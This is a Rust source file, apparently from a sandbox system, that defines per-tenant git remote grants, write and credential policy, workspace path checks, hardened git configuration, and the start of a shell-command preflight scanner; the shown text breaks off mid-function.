//! Host policy for git access from the generic shell sandbox (WI#816, WI#860).
//!
//! The grant is the manifest's reserved extension point: a request may ask for
//! the `git-remotes` extension, and only an explicit, per-tenant host policy
//! (`SANDBOX_GIT_REMOTES`) can grant it. The effective decision names the
//! tenant's allowed remotes, never a credential value.
//!
//! Transport rules:
//! - `file` remotes are virtual `/workspace/...` paths that must initially
//!   resolve inside the call's own workspace. They need no egress.
//! - `http`/`https` remotes require `proxy-enforced`. The per-call proxy
//!   restricts egress to selected hosts already on the tenant allowlist.
//!
//! Non-public destinations (WI#875): `SANDBOX_GIT_PRIVATE_REMOTES` names
//! granted remotes whose exact host and port the operator allows to resolve
//! to a LAN or overlay address. Only a named remote gets the allowance, only
//! its own host and port, and only for RFC 1918, CGNAT or IPv6 ULA
//! addresses: loopback, link-local and the metadata address stay refused.
//! The shared tenant proxy never carries an allowance.
//!
//! Write grant (WI#860): `SANDBOX_GIT_WRITE_REMOTES` names the remotes whose
//! operation classes include `Write`; every other remote stays read-only, and
//! a read-only grant still refuses `git push`. Force push is refused in every
//! preflight spelling, and ref deletion is always refused (no host switch).
//!
//! Credentials (WI#860): `SANDBOX_GIT_CREDENTIALS=remote=ENV_NAME` binds a
//! granted plain-HTTP remote to a daemon environment variable. The per-call
//! egress proxy resolves that variable and adds the `Authorization` header
//! host-side, so the secret never enters the container: not in its
//! environment, files, arguments, process listings or output. The header is
//! added only to the bound repository's own smart-HTTP endpoints. HTTPS
//! travels in an opaque `CONNECT` tunnel the proxy cannot modify, so an HTTPS
//! remote with a credential binding is a load error rather than a silent
//! no-op.
//!
//! Transport checks (WI#860, ALM-1): for plain-HTTP remotes the per-call
//! proxy is the boundary for write and deletion, see
//! [`crate::sandbox::proxy::git_transport`]. It refuses `git-receive-pack`
//! except at a write-granted remote's own endpoints, and refuses a push whose
//! command list deletes a ref. A non-fast-forward update is left to the
//! forge's branch protection.
//!
//! The manifest shell scan is best-effort preflight, not Git authorization:
//! it gives early, friendly refusals and cannot see repository config.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::sandbox::config::SandboxNetworkMode;
use crate::sandbox::error::{Result, SandboxError};
use crate::sandbox::proxy::allowlist::{DomainAllowlist, extract_host};

/// The reserved manifest extension that expresses a git remote grant request.
pub const GIT_REMOTE_EXTENSION: &str = "git-remotes";
/// Stable identifier of the host grant recorded in capability evidence.
pub const GIT_GRANT_ID: &str = "host:sandbox-git-remotes";
/// Capability field used for every git-grant denial.
const GRANT_FIELD: &str = "extensions.git-remotes";
/// Upper bound on configured remotes; keeps manifests and evidence bounded.
pub const MAX_GIT_REMOTES: usize = 32;
const MAX_URL_LEN: usize = 2048;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum GitOperationClass {
    Read,
    Write,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum GitTransport {
    File,
    Http,
    Https,
}

impl GitTransport {
    fn is_network(self) -> bool {
        matches!(self, Self::Http | Self::Https)
    }
}

/// One host-authorized remote. `canonical` is the normalized URL used for
/// exact matching; it is host configuration and is never serialized.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitRemote {
    pub name: String,
    pub url: String,
    pub transport: GitTransport,
    pub host: Option<String>,
    pub canonical: String,
    /// Host policy grants this remote a write operation class
    /// (`SANDBOX_GIT_WRITE_REMOTES`). A remote without it stays read-only.
    pub write: bool,
    /// Host policy allows this remote's exact host and port to resolve to a
    /// LAN or overlay address (`SANDBOX_GIT_PRIVATE_REMOTES`, WI#875).
    pub allow_private: bool,
}

/// Host configuration parsed from `SANDBOX_GIT_REMOTES`.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct GitGrantConfig {
    pub remotes: Vec<GitRemote>,
    /// Per-remote credential source (`SANDBOX_GIT_CREDENTIALS`,
    /// `remote=ENV_NAME`). The value is a daemon-side environment variable
    /// name, resolved host-side only; it never enters the container.
    pub credentials: Vec<GitCredentialSource>,
}

/// A host-side credential binding for one granted remote.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitCredentialSource {
    pub remote: String,
    /// Daemon environment variable that holds the `Authorization` header
    /// value. The variable name is recorded in evidence; its value is not.
    pub secret_env: String,
}

impl GitGrantConfig {
    fn remote_by_name(&self, name: &str) -> Option<&GitRemote> {
        self.remotes.iter().find(|remote| remote.name == name)
    }

    /// Parse `name=url[,name=url...]`. An empty string means "no grant".
    ///
    /// Read-only shorthand: no remote is writable.
    pub fn from_spec(spec: &str) -> std::result::Result<Option<Self>, String> {
        Self::from_parts(spec, "")
    }

    /// Parse the read grant plus the host's separate write list
    /// (`SANDBOX_GIT_WRITE_REMOTES`).
    ///
    /// A write name that is not a read remote is a load error, because a
    /// write grant can never broaden the read one.
    pub fn from_parts(spec: &str, write_names: &str) -> std::result::Result<Option<Self>, String> {
        Self::from_full_spec(spec, write_names, "")
    }

    /// Parse the read grant, the write list and the credential bindings
    /// (`SANDBOX_GIT_CREDENTIALS`). Ref deletion has no host setting: it is
    /// always refused.
    pub fn from_full_spec(
        spec: &str,
        write_names: &str,
        credential_spec: &str,
    ) -> std::result::Result<Option<Self>, String> {
        Self::from_specs(spec, write_names, credential_spec, "")
    }

    /// Parse the read grant, the write list, the credential bindings and the
    /// non-public destination allowance (`SANDBOX_GIT_PRIVATE_REMOTES`,
    /// WI#875). Only an `http`/`https` remote can be named: a `file` remote
    /// never resolves a name.
    pub fn from_specs(
        spec: &str,
        write_names: &str,
        credential_spec: &str,
        private_names: &str,
    ) -> std::result::Result<Option<Self>, String> {
        let spec = spec.trim();
        if spec.is_empty() {
            return Ok(None);
        }
        let writes = parse_write_names(write_names)?;
        let private = parse_write_names(private_names)?;
        let mut remotes = Vec::new();
        for (index, entry) in spec.split(',').enumerate() {
            let entry = entry.trim();
            if entry.is_empty() {
                continue;
            }
            let (name, url) = entry.split_once('=').ok_or_else(|| {
                format!("SANDBOX_GIT_REMOTES entry {} must be name=url", index + 1)
            })?;
            let name = name.trim();
            let url = url.trim();
            if name.is_empty() || url.is_empty() {
                return Err(format!(
                    "SANDBOX_GIT_REMOTES entry {} must have a non-empty name and URL",
                    index + 1
                ));
            }
            validate_remote_name(name)?;
            if remotes.iter().any(|remote: &GitRemote| remote.name == name) {
                return Err("SANDBOX_GIT_REMOTES names must be unique".into());
            }
            if remotes.len() >= MAX_GIT_REMOTES {
                return Err(format!(
                    "SANDBOX_GIT_REMOTES supports at most {MAX_GIT_REMOTES} remotes"
                ));
            }
            let parsed = parse_remote_url(url)?;
            remotes.push(GitRemote {
                name: name.to_string(),
                url: url.to_string(),
                transport: parsed.transport,
                host: parsed.host,
                canonical: parsed.canonical,
                write: writes.contains(&name.to_string()),
                allow_private: private.contains(&name.to_string()),
            });
        }
        if remotes.is_empty() {
            return Ok(None);
        }
        for name in &writes {
            if !remotes.iter().any(|remote| &remote.name == name) {
                return Err(format!(
                    "SANDBOX_GIT_WRITE_REMOTES names '{name}', which is not a SANDBOX_GIT_REMOTES remote"
                ));
            }
        }
        for name in &private {
            let remote = remotes.iter().find(|remote| &remote.name == name).ok_or_else(|| {
                format!(
                    "SANDBOX_GIT_PRIVATE_REMOTES names '{name}', which is not a SANDBOX_GIT_REMOTES remote"
                )
            })?;
            if remote.transport == GitTransport::File {
                return Err(format!(
                    "SANDBOX_GIT_PRIVATE_REMOTES names '{name}', which is a file:// remote; \
                     only an http:// or https:// remote resolves a destination"
                ));
            }
        }
        Ok(Some(Self {
            credentials: parse_credentials(credential_spec, &remotes)?,
            remotes,
        }))
    }
}

/// `remote=ENV_NAME,remote=ENV_NAME` credential bindings.
fn parse_credentials(
    spec: &str,
    remotes: &[GitRemote],
) -> std::result::Result<Vec<GitCredentialSource>, String> {
    let mut credentials = Vec::new();
    for entry in spec.split(',') {
        let entry = entry.trim();
        if entry.is_empty() {
            continue;
        }
        let (remote, secret_env) = entry
            .split_once('=')
            .ok_or_else(|| "SANDBOX_GIT_CREDENTIALS entries must be remote=ENV_NAME".to_string())?;
        let (remote, secret_env) = (remote.trim(), secret_env.trim());
        if remote.is_empty() || secret_env.is_empty() {
            return Err(
                "SANDBOX_GIT_CREDENTIALS entries must have a non-empty remote and variable name"
                    .into(),
            );
        }
        validate_remote_name(remote)?;
        if !is_valid_env_name(secret_env) {
            return Err(format!(
                "SANDBOX_GIT_CREDENTIALS variable '{secret_env}' must be an environment name"
            ));
        }
        let granted = remotes.iter().find(|entry| entry.name == remote).ok_or_else(|| {
            format!(
                "SANDBOX_GIT_CREDENTIALS names '{remote}', which is not a SANDBOX_GIT_REMOTES remote"
            )
        })?;
        if granted.transport != GitTransport::Http {
            return Err(format!(
                "SANDBOX_GIT_CREDENTIALS remote '{remote}' must use an http:// URL; \
                 the proxy can inject a credential only into plain-HTTP requests, and \
                 https:// travels in an opaque CONNECT tunnel"
            ));
        }
        if credentials
            .iter()
            .any(|existing: &GitCredentialSource| existing.remote == remote)
        {
            return Err(format!(
                "SANDBOX_GIT_CREDENTIALS binds remote '{remote}' more than once"
            ));
        }
        credentials.push(GitCredentialSource {
            remote: remote.to_string(),
            secret_env: secret_env.to_string(),
        });
    }
    Ok(credentials)
}

fn is_valid_env_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 128
        && name.bytes().enumerate().all(|(index, byte)| {
            if index == 0 {
                byte.is_ascii_alphabetic() || byte == b'_'
            } else {
                byte.is_ascii_alphanumeric() || byte == b'_'
            }
        })
}

/// `name,name` write-list parsing. Empty means "no remote is writable".
fn parse_write_names(spec: &str) -> std::result::Result<Vec<String>, String> {
    let mut names = Vec::new();
    for entry in spec.split(',') {
        let entry = entry.trim();
        if entry.is_empty() {
            continue;
        }
        validate_remote_name(entry)?;
        if !names.iter().any(|name: &String| name == entry) {
            names.push(entry.to_string());
        }
    }
    Ok(names)
}

/// The authorized grant for one execution. Host-derived; never request-supplied.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GitGrantAuthorization {
    pub grant: String,
    pub cwd: PathBuf,
    pub remotes: Vec<GitRemote>,
    /// Network modes in which this grant is supported.
    pub egress: Vec<SandboxNetworkMode>,
    /// Host-side credential bindings, resolved by the per-call proxy.
    pub credentials: Vec<GitCredentialSource>,
}

/// Secret-free evidence describing the applied grant.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct EffectiveGitCapability {
    pub grant: String,
    pub egress: Vec<SandboxNetworkMode>,
    pub remotes: Vec<EffectiveGitRemote>,
    /// Host-side credential bindings by remote and variable *name*.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub credentials: Vec<EffectiveGitCredential>,
}

/// Secret-free credential evidence. Records which host variable backs which
/// remote, never the variable's value.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct EffectiveGitCredential {
    pub remote: String,
    pub secret_env: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(deny_unknown_fields)]
pub struct EffectiveGitRemote {
    pub name: String,
    pub transport: GitTransport,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    pub operations: Vec<GitOperationClass>,
    /// The operator allowed this remote's exact host and port to resolve to a
    /// LAN or overlay address (WI#875).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub private_destination: bool,
}

impl GitRemote {
    /// The operation classes this remote is granted, host-side.
    pub fn operations(&self) -> Vec<GitOperationClass> {
        if self.write {
            vec![GitOperationClass::Read, GitOperationClass::Write]
        } else {
            vec![GitOperationClass::Read]
        }
    }
}

impl GitGrantAuthorization {
    /// Host-side credential mappings for the per-call egress proxy.
    ///
    /// Route (b): the proxy adds the `Authorization` header to a plain-HTTP
    /// request, so the secret is resolved and applied on the host and never
    /// enters the container. A remote without a binding contributes nothing.
    ///
    /// Each mapping is scoped to the bound repository's own smart-HTTP
    /// endpoints (WI#860, ALM-1), never the whole host; the git transport
    /// policy additionally checks the port, query and method.
    pub fn proxy_credentials(&self) -> Vec<crate::secrets::CredentialMapping> {
        let mut mappings = Vec::new();
        for source in &self.credentials {
            let Some(remote) = self.remote_by_name(&source.remote) else {
                continue;
            };
            let Some(transport) =
                crate::sandbox::proxy::git_transport::GitTransportRemote::from_http_url(
                    &remote.url,
                    remote.write,
                    Some(source.secret_env.clone()),
                )
            else {
                continue;
            };
            let mut mapping = crate::secrets::CredentialMapping::header(
                source.secret_env.clone(),
                "Authorization",
                transport.host.clone(),
            );
            mapping.path_patterns = transport.credential_paths();
            mappings.push(mapping);
        }
        mappings
    }

    /// The smart-HTTP transport policy of this call's per-call git proxy
    /// (WI#860, ALM-1): every selected plain-HTTP remote with its write class
    /// and the variable bound to it, and the host and port of every selected
    /// `https://` remote as the only `CONNECT` targets.
    pub fn transport_policy(&self) -> crate::sandbox::proxy::git_transport::GitTransportPolicy {
        let remotes = self
            .remotes
            .iter()
            .filter_map(|remote| {
                let secret_env = self
                    .credentials
                    .iter()
                    .find(|source| source.remote == remote.name)
                    .map(|source| source.secret_env.clone());
                crate::sandbox::proxy::git_transport::GitTransportRemote::from_http_url(
                    &remote.url,
                    remote.write,
                    secret_env,
                )
            })
            .collect();
        self.remotes
            .iter()
            .filter(|remote| remote.transport == GitTransport::Https)
            .fold(
                crate::sandbox::proxy::git_transport::GitTransportPolicy::new(remotes),
                |policy, remote| policy.with_https_tunnel(&remote.url),
            )
    }

    /// The non-public destinations the operator allowed for this call
    /// (WI#875): the exact host and port of every selected remote named in
    /// `SANDBOX_GIT_PRIVATE_REMOTES`. Nothing else is allowed, and a remote
    /// without the allowance contributes nothing.
    pub fn private_egress(&self) -> crate::sandbox::proxy::PrivateEgress {
        let mut allowance = crate::sandbox::proxy::PrivateEgress::new();
        for remote in self.remotes.iter().filter(|remote| remote.allow_private) {
            let Some(parsed) = url::Url::parse(&remote.url).ok() else {
                continue;
            };
            let (Some(host), Some(port)) = (parsed.host_str(), parsed.port_or_known_default())
            else {
                continue;
            };
            allowance = allowance.allow(host, port);
        }
        allowance
    }

    /// Secret-free credential evidence: the remote name and the *name* of the
    /// daemon variable, never its value.
    fn credential_evidence(&self) -> Vec<EffectiveGitCredential> {
        self.credentials
            .iter()
            .map(|source| EffectiveGitCredential {
                remote: source.remote.clone(),
                secret_env: source.secret_env.clone(),
            })
            .collect()
    }

    /// Project the tenant ACL onto the exact hosts selected for this call.
    /// Never enable a domain just because it occurs in a configured remote.
    pub(super) fn proxy_hosts(&self, base_allowlist: &[String]) -> Result<Vec<String>> {
        let allowlist = DomainAllowlist::new(base_allowlist);
        let mut hosts = Vec::new();
        for host in self
            .remotes
            .iter()
            .filter_map(|remote| remote.host.as_ref())
        {
            if !allowlist.is_allowed(host).is_allowed() {
                return Err(denied(
                    "selected git remote host is outside the sandbox egress allowlist",
                ));
            }
            if !hosts.contains(host) {
                hosts.push(host.clone());
            }
        }
        Ok(hosts)
    }

    pub fn evidence(&self) -> EffectiveGitCapability {
        EffectiveGitCapability {
            grant: self.grant.clone(),
            egress: self.egress.clone(),
            remotes: self
                .remotes
                .iter()
                .map(|remote| EffectiveGitRemote {
                    name: remote.name.clone(),
                    transport: remote.transport,
                    host: remote.host.clone(),
                    operations: remote.operations(),
                    private_destination: remote.allow_private,
                })
                .collect(),
            credentials: self.credential_evidence(),
        }
    }

    /// Git configuration passed to the container through `GIT_CONFIG_*` env
    /// entries. Values are granted remote URLs and hardening switches only;
    /// no credential, token, key or credential-helper command is included.
    ///
    /// Each remote is pinned with an empty `remote.<name>.url` first: setting
    /// that key to the empty string clears the URL list, so a repository-local
    /// URL (written after a clone, and read before these entries) cannot win.
    /// Measured on git 2.39.5 (image) and 2.56.1 (dev).
    pub fn container_env(&self) -> Vec<(String, String)> {
        let mut env = vec![
            ("GIT_TERMINAL_PROMPT".to_string(), "0".to_string()),
            ("GIT_CONFIG_NOSYSTEM".to_string(), "1".to_string()),
            ("GIT_CONFIG_GLOBAL".to_string(), "/dev/null".to_string()),
        ];
        let mut index = 0usize;
        for remote in &self.remotes {
            env.push((
                format!("GIT_CONFIG_KEY_{index}"),
                format!("remote.{}.url", remote.name),
            ));
            env.push((format!("GIT_CONFIG_VALUE_{index}"), String::new()));
            index += 1;
            env.push((
                format!("GIT_CONFIG_KEY_{index}"),
                format!("remote.{}.url", remote.name),
            ));
            env.push((format!("GIT_CONFIG_VALUE_{index}"), remote.url.clone()));
            index += 1;
        }
        // An empty helper resets any helper inherited from the image config,
        // so a credential prompt cannot block the command and no image-level
        // helper can supply a credential the host did not grant.
        env.push((
            format!("GIT_CONFIG_KEY_{index}"),
            "credential.helper".to_string(),
        ));
        env.push((format!("GIT_CONFIG_VALUE_{index}"), String::new()));
        env.push(("GIT_CONFIG_COUNT".to_string(), (index + 1).to_string()));
        env
    }

    fn remote_by_name(&self, name: &str) -> Option<&GitRemote> {
        self.remotes.iter().find(|remote| remote.name == name)
    }
}

/// Authorize the request against host policy and the call's workspace.
///
/// `requested` names remotes to narrow the grant; an empty list means every
/// host-granted remote. A requested name outside the host list, a network
/// remote under an egress mode that cannot carry it, or a `file` remote that
/// resolves outside the workspace is a `capability_denied`.
pub fn authorize_grant(
    host: &GitGrantConfig,
    requested: &[String],
    cwd: &Path,
    network: SandboxNetworkMode,
) -> Result<GitGrantAuthorization> {
    if host.remotes.is_empty() {
        return Err(denied(
            "no host git grant is configured for this tenant; \
             SANDBOX_GIT_REMOTES is empty or unset",
        ));
    }
    let selected: Vec<GitRemote> = if requested.is_empty() {
        host.remotes.clone()
    } else {
        let mut selected = Vec::new();
        for name in requested {
            let remote = host.remote_by_name(name).ok_or_else(|| {
                denied(format!(
                    "remote '{name}' is not in this tenant's host git grant"
                ))
            })?;
            if !selected
                .iter()
                .any(|chosen: &GitRemote| chosen.name == remote.name)
            {
                selected.push(remote.clone());
            }
        }
        selected
    };
    let needs_proxy = selected.iter().any(|remote| remote.transport.is_network());
    if network == SandboxNetworkMode::Proxy {
        return Err(denied(
            "git-remotes is not supported in advisory proxy mode",
        ));
    }
    if needs_proxy && network != SandboxNetworkMode::ProxyEnforced {
        return Err(denied(
            "HTTP(S) git remotes require network.mode=proxy-enforced",
        ));
    }
    for remote in &selected {
        if remote.transport == GitTransport::File {
            validate_file_remote(remote, cwd)?;
        }
    }
    let egress = if needs_proxy {
        vec![SandboxNetworkMode::ProxyEnforced]
    } else {
        vec![
            SandboxNetworkMode::ProxyEnforced,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::None,
        ]
    };
    let credentials = host
        .credentials
        .iter()
        .filter(|source| selected.iter().any(|remote| remote.name == source.remote))
        .cloned()
        .collect();
    Ok(GitGrantAuthorization {
        grant: GIT_GRANT_ID.to_string(),
        cwd: cwd.to_path_buf(),
        remotes: selected,
        egress,
        credentials,
    })
}

/// A `file` remote is a virtual `/workspace/...` URL. Resolve it against the
/// canonical workspace and require the real path to stay inside it.
fn validate_file_remote(remote: &GitRemote, cwd: &Path) -> Result<()> {
    let relative = remote
        .canonical
        .strip_prefix("file:///workspace/")
        .ok_or_else(|| {
            denied(format!(
                "remote '{}' is not a virtual /workspace path",
                remote.name
            ))
        })?;
    let joined = cwd.join(relative);
    let canonical = joined.canonicalize().map_err(|error| {
        denied(format!(
            "file remote '{}' at {} is not readable: {error}",
            remote.name,
            joined.display()
        ))
    })?;
    if !canonical.starts_with(cwd) {
        return Err(denied(format!(
            "file remote '{}' resolves outside the call workspace",
            remote.name
        )));
    }
    if !canonical.is_dir() {
        return Err(denied(format!(
            "file remote '{}' is not a directory",
            remote.name
        )));
    }
    Ok(())
}

/// Check recognizable Git invocations before running a declared manifest.
/// This scan cannot mediate commands constructed at runtime or repository
/// configuration. Egress isolation is independent of the scan.
pub(super) fn authorize_shell_command(
    command: &str,
    grant: Option<&GitGrantAuthorization>,
    network: SandboxNetworkMode,
) -> Result<()> {
    let preflight = Preflight {
        grant,
        offline: network == SandboxNetworkMode::None,
    };
    for simple in tokenize_simple_commands(command)? {
        scan_simple_command(&simple, preflight, 0)?;
    }
    Ok(())
}

fn denied(reason: impl Into<String>) -> SandboxError {
    SandboxError::CapabilityDenied {
        field: GRANT_FIELD.to_string(),
        reason: format!(
            "sandbox capability manifest version 1: {GRANT_FIELD}: {}",
            reason.into()
        ),
    }
}

fn validate_remote_name(name: &str) -> std::result::Result<(), String> {
    let valid = !name.is_empty()
        && name.len() <= 128
        && name.bytes().all(|byte| {
            byte.is_ascii_lowercase() || byte.is_ascii_digit() || matches!(byte, b'_' | b'-' | b'.')
        });
    if valid {
        Ok(())
    } else {
        Err(
            "SANDBOX_GIT_REMOTES remote names must be 1-128 lowercase ASCII letters, \
             digits, '.', '_' or '-'"
                .into(),
        )
    }
}

struct ParsedRemoteUrl {
    transport: GitTransport,
    host: Option<String>,
    canonical: String,
}

/// Parse a remote URL from host policy. Credentials must never be embedded,
/// and only the transports this grant can actually mediate are accepted.
fn parse_remote_url(raw: &str) -> std::result::Result<ParsedRemoteUrl, String> {
    let raw = raw.trim();
    if raw.is_empty() || raw.len() > MAX_URL_LEN {
        return Err("SANDBOX_GIT_REMOTES URLs must be 1-2048 bytes".to_string());
    }
    if raw.chars().any(|c| c.is_control() || c.is_whitespace()) {
        return Err(
            "SANDBOX_GIT_REMOTES URLs must not contain whitespace or control bytes".to_string(),
        );
    }
    if raw.contains('@') {
        return Err("SANDBOX_GIT_REMOTES URLs must not embed credentials or userinfo".into());
    }
    let (scheme, rest) = raw
        .split_once("://")
        .ok_or("SANDBOX_GIT_REMOTES requires absolute remote URLs")?;
    let scheme = scheme.to_ascii_lowercase();
    if rest.contains('?') || rest.contains('#') {
        return Err("SANDBOX_GIT_REMOTES URLs must not carry a query or fragment".into());
    }
    match scheme.as_str() {
        "https" | "http" => {
            let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
            if authority.is_empty() || raw.contains('\\') {
                return Err("SANDBOX_GIT_REMOTES contains an invalid HTTP(S) URL".into());
            }
            let host = extract_host(raw)
                .filter(|host| !host.contains('*'))
                .ok_or("SANDBOX_GIT_REMOTES requires a valid, literal HTTP(S) host")?;
            let transport = if scheme == "https" {
                GitTransport::Https
            } else {
                GitTransport::Http
            };
            Ok(ParsedRemoteUrl {
                transport,
                host: Some(host),
                canonical: format!("{scheme}://{}/{path}", authority.to_ascii_lowercase()),
            })
        }
        "file" => {
            let relative = rest
                .strip_prefix("/workspace/")
                .ok_or("SANDBOX_GIT_REMOTES file URLs must be under the virtual /workspace path")?;
            if relative.contains(['%', '\\']) {
                return Err(
                    "SANDBOX_GIT_REMOTES file URLs must use literal workspace paths".into(),
                );
            }
            validate_virtual_relative_path(relative)?;
            Ok(ParsedRemoteUrl {
                transport: GitTransport::File,
                host: None,
                canonical: format!("file:///workspace/{relative}"),
            })
        }
        _ => Err("SANDBOX_GIT_REMOTES supports only https, http, or file URLs".into()),
    }
}

fn validate_virtual_relative_path(relative: &str) -> std::result::Result<(), String> {
    if relative.is_empty() {
        return Err("SANDBOX_GIT_REMOTES file URL must name a path under /workspace".to_string());
    }
    for component in relative.split('/') {
        if component.is_empty() || component == "." || component == ".." {
            return Err(
                "SANDBOX_GIT_REMOTES file paths must not contain empty, '.' or '..' components"
                    .into(),
            );
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Shell command scanning
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct Word {
    text: String,
    dynamic: bool,
}

#[derive(Clone, Copy)]
struct Preflight<'a> {
    grant: Option<&'a GitGrantAuthorization>,
    offline: bool,
}

impl Preflight<'_> {
    fn allows_local_read(self) -> bool {
        self.grant.is_none() && self.offline
    }

    fn read_remote(self, word: &Word) -> Result<()> {
        if self.allows_local_read() && !word.dynamic && is_explicit_local_path(&word.text) {
            return Ok(());
        }
        authorize_url_or_name(word, self.grant)
    }

    /// Resolve a push destination to a remote the host granted a write class.
    fn write_remote(self, word: &Word) -> Result<()> {
        let grant = self.grant.ok_or_else(no_grant_denial)?;
        if word.dynamic {
            return Err(denied(
                "dynamic git remote argument cannot be authorized; name a write-granted remote",
            ));
        }
        let remote = if let Some(remote) = grant.remote_by_name(&word.text) {
            remote
        } else {
            let canonical = canonicalize_command_url(&word.text)?;
            grant
                .remotes
                .iter()
                .find(|remote| remote.canonical == canonical)
                .ok_or_else(|| denied("git remote is not in this tenant's host git grant"))?
        };
        if !remote.write {
            return Err(denied(format!(
                "remote '{}' is read-only in this tenant's git grant; \
                 a write grant requires SANDBOX_GIT_WRITE_REMOTES",
                remote.name
            )));
        }
        Ok(())
    }
}

fn is_explicit_local_path(raw: &str) -> bool {
    raw == "."
        || ["./", "/workspace/", "file:///workspace/"]
            .iter()
            .any(|prefix| {
                raw.strip_prefix(prefix).is_some_and(|path| {
                    !path.contains(':') && validate_virtual_relative_path(path).is_ok()
                })
            })
}

/// Split a shell command into simple commands. Quote-aware; command
/// separators end a command. Dynamic expansions are flagged, not evaluated.
fn tokenize_simple_commands(input: &str) -> Result<Vec<Vec<Word>>> {
    let mut commands = Vec::new();
    let mut words = Vec::new();
    let mut current = String::new();
    let mut dynamic = false;
    let mut started = false;
    let mut quote: Option<char> = None;
    let mut chars = input.chars();

    let finish_word =
        |words: &mut Vec<Word>, current: &mut String, dynamic: &mut bool, started: &mut bool| {
            if *started {
                words.push(Word {
                    text: std::mem::take(current),
                    dynamic: *dynamic,
                });
                *dynamic = false;
                *started = false;
            }
        };
    let finish_command = |commands: &mut Vec<Vec<Word>>, words: &mut Vec<Word>| {
        if !words.is_empty() {
            commands.push(std::mem::take(words));
        }
    };

    while let Some(c) = chars.next() {
        match quote {
            Some('\'') => {
                started = true;
                if c == '\'' {
                    quote = None;
                } else {
                    current.push(c);
                }
            }
            Some('"') => {
                started = true;
                match c {
                    '"' => quote = None,
                    '\\' => {
                        if let Some(next) = chars.next()
                            && next != '\n'
                        {
                            current.push(next);
                        }
                    }
                    '$' | '`' => {
                        dynamic = true;
                        current.push(c);
                    }
                    _ => current.push(c),
                }
            }
            Some(_) => unreachable!("quote state is ' or \""),
            None => match c {
                '\'' | '"' => {
                    quote = Some(c);
                    started = true;
                }
                '\\' => match chars.next() {
                    Some('\n') => {}
                    Some(next) => {
                        started = true;
                        current.push(next);
                    }
                    None => return Err(denied("incomplete shell escape")),
                },
                '#' if !started => {
                    for next in chars.by_ref() {
                        if next == '\n' {
                            break;
                        }
                    }
                    finish_command(&mut commands, &mut words);
                }
                ';' | '\n' | '|' | '&' | '(' | ')' => {
                    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
                    finish_command(&mut commands, &mut words);
                }
                ' ' | '\t' | '\r' => {
                    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
                }
                '$' | '`' => {
                    dynamic = true;
                    current.push(c);
                    started = true;
                }
                _ => {
                    current.push(c);
                    started = true;
                }
            },
        }
    }
    if quote.is_some() {
        return Err(denied("unterminated shell quote"));
    }
    finish_word(&mut words, &mut current, &mut dynamic, &mut started);
    finish_command(&mut commands, &mut words);
    Ok(commands)
}

fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    // `NAME+=value` appends, and reaches the same variable as `NAME=value`.
    let name = name.strip_suffix('+').unwrap_or(name);
    !name.is_empty()
        && name.bytes().enumerate().all(|(index, byte)| {
            if index == 0 {
                byte.is_ascii_alphabetic() || byte == b'_'
            } else {
                byte.is_ascii_alphanumeric() || byte == b'_'
            }
        })
}

fn basename(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

/// A shell that could be given a `-c` script the scan must read.
fn is_shell_name(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash" | "dash" | "zsh" | "ash" | "ksh" | "mksh" | "fish" | "csh" | "tcsh"
    )
}

/// Words that are shell syntax rather than a command: the negation and
/// grouping prefixes, and the reserved words that introduce a command.
fn is_command_prefix_word(name: &str) -> bool {
    matches!(
        name,
        "!" | "{"
            | "}"
            | "if"
            | "then"
            | "elif"
            | "else"
            | "fi"
            | "while"
            | "until"
            | "do"
            | "done"
            | "esac"
            | "for"
            | "in"
            | "case"
            | "select"
            | "function"
    )
}

/// Shell builtins that print or transform their arguments instead of running
/// them, so a later `git` word after one of these is data. Anything not here
/// is treated as a possible wrapper whose arguments could be the command.
const INERT_COMMANDS: &[&str] = &[
    "echo", "true", "false", "test", "[", "[[", ":", "cd", "pwd", "exit", "return", "shift",
    "wait", "type", "hash", "umask", "ulimit", "set", "trap", "jobs", "fg", "bg", "let", "shopt",
    "alias", "unalias", "times", "help", "history", "getopts", "caller", "disown", "dirs", "pushd",
    "popd",
];

/// A simple command whose leading word the scan does not know is refused when
/// a later word in the same clause names Git, a Git plumbing executable, or a
/// shell that could run one: the scan cannot tell an ordinary argument from
/// the command a wrapper runs.
fn refuse_unread_git_tail(words: &[Word], from: usize) -> Result<()> {
    let command = basename(&words[from].text);
    if INERT_COMMANDS.contains(&command) || matches!(command, "grep" | "which" | "ps" | "ls") {
        return Ok(());
    }
    for word in &words[from + 1..] {
        if word.dynamic {
            continue;
        }
        let name = basename(&word.text);
        if name == "git" || is_git_plumbing_executable(name) || is_shell_name(name) {
            return Err(denied(format!(
                "a command this preflight cannot read ({command}) names git; use a recognized command form"
            )));
        }
    }
    Ok(())
}

/// Step over a wrapper's option words, returning the index of its first
/// operand. `value_options` names the options that consume a separate word.
/// A lone `-` and `--` are options, as GNU wrappers read them.
fn skip_wrapper_options(words: &[Word], mut index: usize, value_options: &[&str]) -> usize {
    while index < words.len() {
        let word = words[index].text.as_str();
        if word == "--" {
            return index + 1;
        }
